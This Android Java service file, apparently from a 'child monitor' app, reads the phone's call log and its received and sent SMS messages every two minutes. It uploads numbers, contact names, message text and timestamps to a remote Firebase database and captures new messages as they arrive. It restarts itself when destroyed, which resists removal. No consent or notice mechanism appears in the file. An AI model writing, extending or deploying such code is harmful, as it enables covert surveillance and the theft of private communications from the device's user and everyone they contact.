package com.childmonitor.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;

import androidx.annotation.Nullable;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class CallSmsService extends Service {

    private static final long SYNC_INTERVAL = 2 * 60 * 1000;
    private Handler handler;
    private Runnable syncRunnable;
    private DatabaseReference callSmsRef;
    private long lastSyncTime = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        String deviceId = getSharedPreferences("cm_prefs", MODE_PRIVATE)
                .getString("device_id", "unknown");
        callSmsRef = FirebaseDatabase.getInstance()
                .getReference("devices")
                .child(deviceId)
                .child("communications");
        handler = new Handler(Looper.getMainLooper());
        startSyncing();
    }

    private void startSyncing() {
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncCallLogs();
                syncSmsLogs();
                lastSyncTime = System.currentTimeMillis();
                handler.postDelayed(this, SYNC_INTERVAL);
            }
        };
        handler.post(syncRunnable);
    }

    private void syncCallLogs() {
        ContentResolver cr = getContentResolver();
        String selection = lastSyncTime > 0 ?
            CallLog.Calls.DATE + " > " + lastSyncTime : null;
        Cursor cursor = cr.query(
            CallLog.Calls.CONTENT_URI,
            new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            },
            selection, null,
            CallLog.Calls.DATE + " DESC"
        );
        if (cursor == null) return;
        while (cursor.moveToNext()) {
            String number = cursor.getString(0);
            String name = cursor.getString(1);
            int type = cursor.getInt(2);
            long date = cursor.getLong(3);
            int duration = cursor.getInt(4);
            String callType = "Unknown";
            if (type == CallLog.Calls.INCOMING_TYPE) callType = "Incoming";
            else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "Outgoing";
            else if (type == CallLog.Calls.MISSED_TYPE) callType = "Missed";
            Map<String, Object> callData = new HashMap<>();
            callData.put("number", number);
            callData.put("name", name != null ? name : "Unknown");
            callData.put("type", callType);
            callData.put("duration_sec", duration);
            callData.put("timestamp", date);
            callData.put("date_str", new SimpleDateFormat("yyyy-MM-dd HH:mm",
                    Locale.getDefault()).format(new Date(date)));
            callSmsRef.child("calls").child(String.valueOf(date)).setValue(callData);
        }
        cursor.close();
    }

    private void syncSmsLogs() {
        ContentResolver cr = getContentResolver();
        String selection = lastSyncTime > 0 ?
            "date > " + lastSyncTime : null;
        syncSmsFolder(cr, android.provider.Telephony.Sms.Inbox.CONTENT_URI, "received", selection);
        syncSmsFolder(cr, android.provider.Telephony.Sms.Sent.CONTENT_URI, "sent", selection);
    }

    private void syncSmsFolder(ContentResolver cr, android.net.Uri uri, String folder, String selection) {
        Cursor cursor = cr.query(uri,
            new String[]{"address", "body", "date"},
            selection, null, "date DESC");
        if (cursor == null) return;
        while (cursor.moveToNext()) {
            String number = cursor.getString(0);
            String body = cursor.getString(1);
            long date = cursor.getLong(2);
            if (body != null && body.length() > 500) {
                body = body.substring(0, 500) + "...";
            }
            Map<String, Object> smsData = new HashMap<>();
            smsData.put("number", number);
            smsData.put("message", body);
            smsData.put("folder", folder);
            smsData.put("timestamp", date);
            smsData.put("date_str", new SimpleDateFormat("yyyy-MM-dd HH:mm",
                    Locale.getDefault()).format(new Date(date)));
            callSmsRef.child("sms").child(folder + "_" + date).setValue(smsData);
        }
        cursor.close();
    }

    private void saveRealtimeSms(String number, String body) {
        Map<String, Object> smsData = new HashMap<>();
        smsData.put("number", number);
        smsData.put("message", body);
        smsData.put("folder", "received");
        smsData.put("timestamp", System.currentTimeMillis());
        smsData.put("realtime", true);
        callSmsRef.child("sms").child("realtime_" + System.currentTimeMillis()).setValue(smsData);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("new_sms")) {
            String number = intent.getStringExtra("sms_number");
            String body = intent.getStringExtra("sms_body");
            saveRealtimeSms(number, body);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null && syncRunnable != null) {
            handler.removeCallbacks(syncRunnable);
        }
        startService(new Intent(this, CallSmsService.class));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
